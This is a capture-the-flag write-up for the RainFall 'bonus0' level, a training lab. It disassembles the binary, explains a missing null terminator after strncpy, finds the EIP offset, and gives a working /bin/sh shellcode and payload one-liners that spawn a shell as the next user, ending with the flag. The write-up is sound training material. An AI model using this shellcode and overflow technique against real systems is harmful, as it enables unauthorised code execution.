Usage of the program:

```
bonus0@RainFall:~$ ./bonus0 
 - 
yo
 - 
yoo
yo yoo
```

Objdump :

```nasm
080484b4 <p>:
 80484b4:	55                   	push   %ebp
 80484b5:	89 e5                	mov    %esp,%ebp
 80484b7:	81 ec 18 10 00 00    	sub    $0x1018,%esp
 80484bd:	8b 45 0c             	mov    0xc(%ebp),%eax
 80484c0:	89 04 24             	mov    %eax,(%esp)
 80484c3:	e8 e8 fe ff ff       	call   80483b0 <puts@plt>
 80484c8:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
 80484cf:	00 
 80484d0:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 80484d6:	89 44 24 04          	mov    %eax,0x4(%esp)
 80484da:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 80484e1:	e8 9a fe ff ff       	call   8048380 <read@plt>
 80484e6:	c7 44 24 04 0a 00 00 	movl   $0xa,0x4(%esp)
 80484ed:	00 
 80484ee:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 80484f4:	89 04 24             	mov    %eax,(%esp)
 80484f7:	e8 d4 fe ff ff       	call   80483d0 <strchr@plt>
 80484fc:	c6 00 00             	movb   $0x0,(%eax)
 80484ff:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 8048505:	c7 44 24 08 14 00 00 	movl   $0x14,0x8(%esp)
 804850c:	00 
 804850d:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048511:	8b 45 08             	mov    0x8(%ebp),%eax
 8048514:	89 04 24             	mov    %eax,(%esp)
 8048517:	e8 d4 fe ff ff       	call   80483f0 <strncpy@plt>
 804851c:	c9                   	leave  
 804851d:	c3                   	ret    

0804851e <pp>:
 804851e:	55                   	push   %ebp
 804851f:	89 e5                	mov    %esp,%ebp
 8048521:	57                   	push   %edi
 8048522:	53                   	push   %ebx
 8048523:	83 ec 50             	sub    $0x50,%esp
 8048526:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
 804852d:	08 
 804852e:	8d 45 d0             	lea    -0x30(%ebp),%eax
 8048531:	89 04 24             	mov    %eax,(%esp)
 8048534:	e8 7b ff ff ff       	call   80484b4 <p>
 8048539:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
 8048540:	08 
 8048541:	8d 45 e4             	lea    -0x1c(%ebp),%eax
 8048544:	89 04 24             	mov    %eax,(%esp)
 8048547:	e8 68 ff ff ff       	call   80484b4 <p>
 804854c:	8d 45 d0             	lea    -0x30(%ebp),%eax
 804854f:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048553:	8b 45 08             	mov    0x8(%ebp),%eax
 8048556:	89 04 24             	mov    %eax,(%esp)
 8048559:	e8 42 fe ff ff       	call   80483a0 <strcpy@plt>
 804855e:	bb a4 86 04 08       	mov    $0x80486a4,%ebx
 8048563:	8b 45 08             	mov    0x8(%ebp),%eax
 8048566:	c7 45 c4 ff ff ff ff 	movl   $0xffffffff,-0x3c(%ebp)
 804856d:	89 c2                	mov    %eax,%edx
 804856f:	b8 00 00 00 00       	mov    $0x0,%eax
 8048574:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
 8048577:	89 d7                	mov    %edx,%edi
 8048579:	f2 ae                	repnz scas %es:(%edi),%al
 804857b:	89 c8                	mov    %ecx,%eax
 804857d:	f7 d0                	not    %eax
 804857f:	83 e8 01             	sub    $0x1,%eax
 8048582:	03 45 08             	add    0x8(%ebp),%eax
 8048585:	0f b7 13             	movzwl (%ebx),%edx
 8048588:	66 89 10             	mov    %dx,(%eax)
 804858b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
 804858e:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048592:	8b 45 08             	mov    0x8(%ebp),%eax
 8048595:	89 04 24             	mov    %eax,(%esp)
 8048598:	e8 f3 fd ff ff       	call   8048390 <strcat@plt>
 804859d:	83 c4 50             	add    $0x50,%esp
 80485a0:	5b                   	pop    %ebx
 80485a1:	5f                   	pop    %edi
 80485a2:	5d                   	pop    %ebp
 80485a3:	c3                   	ret    

080485a4 <main>:
 80485a4:	55                   	push   %ebp
 80485a5:	89 e5                	mov    %esp,%ebp
 80485a7:	83 e4 f0             	and    $0xfffffff0,%esp
 80485aa:	83 ec 40             	sub    $0x40,%esp
 80485ad:	8d 44 24 16          	lea    0x16(%esp),%eax
 80485b1:	89 04 24             	mov    %eax,(%esp)
 80485b4:	e8 65 ff ff ff       	call   804851e <pp>
 80485b9:	8d 44 24 16          	lea    0x16(%esp),%eax
 80485bd:	89 04 24             	mov    %eax,(%esp)
 80485c0:	e8 eb fd ff ff       	call   80483b0 <puts@plt>
 80485c5:	b8 00 00 00 00       	mov    $0x0,%eax
 80485ca:	c9                   	leave  
 80485cb:	c3                   	ret
```

Starting from this number of characters in the two respective strings, we observe a segfault appearing:

```nasm
(python -c 'print "A" * 20'; python -c 'print "B" * 17')  | ./bonus0
```

To calculate the offset for rewriting EIP, I generate a string of size 30 using this website:  https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

```nasm
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9
AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

The offset is therefore 9.

In the function p(), the program reads from standard input for 4096 characters and tries to replace the `\n` with a `\0`. However, the subsequent strncpy only goes up to 20, so if the line exceeds 20 characters, there won't be a `\0` added.

The idea is to redirect EIP to our shellcode. We can use the environment to have a buffer under control during program execution.

To do this:

```nasm
export EXPLOIT=$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

Then, we launch gdb and search for the address where our environment variable is stored:

```nasm
x/200s environ

...

0xbffff8db:	 ""
0xbffff8dc:	 ""
0xbffff8dd:	 ""
0xbffff8de:	 "/home/user/bonus0/bonus0"
0xbffff8f7:	 "EXPLOIT=1\311\367\341Qh//shh/bin\211\343\260\v̀"
0xbffff915:	 "SHELL=/bin/bash"
0xbffff925:	 "TERM=xterm-256color"
0xbffff939:	 "SSH_CLIENT=10.0.2.2 52034 4242"
0xbffff958:	 "SSH_TTY=/dev/pts/0"
0xbffff96b:	 "USER=bonus0"

(gdb) x/s 0xbffff8f7
0xbffff8f7:	 "EXPLOIT=1\311\367\341Qh//shh/bin\211\343\260\v̀"
```

Our exploit is thus at this address. To obtain the precise byte of the shellcode, we need to pass the values EXPLOIT=, so we'll end up at `0xbffff8f7 + 8`, which is `0xbffff8ff`.

To confirm this, we can see that the first bytes of the shellcode (31 c9 f7...) are indeed located at this address:

```nasm
(gdb) x/50x 0xbffff8f7
0xbffff8f7:	0x45	0x58	0x50	0x4c	0x4f	0x49	0x54	0x3d
0xbffff8ff:	0x31	0xc9	0xf7	0xe1	0x51	0x68	0x2f	0x2f
0xbffff907:	0x73	0x68	0x68	0x2f	0x62	0x69	0x6e	0x89
0xbffff90f:	0xe3	0xb0	0x0b	0xcd	0x80	0x00	0x53	0x48
0xbffff917:	0x45	0x4c	0x4c	0x3d	0x2f	0x62	0x69	0x6e
0xbffff91f:	0x2f	0x62	0x61	0x73	0x68	0x00	0x54	0x45
0xbffff927:	0x52	0x4d
```

So, precisely here is where we need to redirect EIP.

Let's try a payload in the form (line1 = "A" * 20) (line2 = "A" * 9 + addr(4 bytes) + "A" * 7)

```nasm
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "A" * 9 + "\xff\xf8\xff\xbf" + "A" * 7'; cat)  | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���

Segmentation fault (core dumped)
```

Oops 🙂

After some adjustments, I eventually found the precise location to be at `0xbffff90f`, which is 16 bytes further:

```nasm
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "A" * 9 + "\x0f\xf9\xff\xbf" + "A" * 7'; cat)  | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA��� AAAAAAAAA���AAAAAAA���
whoami
bonus1
```

To avoid this kind of error, always add a few NOP instructions to ensure that you land roughly in the right place with an acceptable margin of error. For example, if we add NOPs before our shellcode in our environment variable, we indeed end up directly on it with `0xbffff8ff`:

```nasm
bonus0@RainFall:~$ export EXPLOIT=$(python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "A" * 9 + "\xff\xf8\xff\xbf" + "A" * 7'; cat)  | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���

whoami
bonus1
```

here's the flag:

```
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```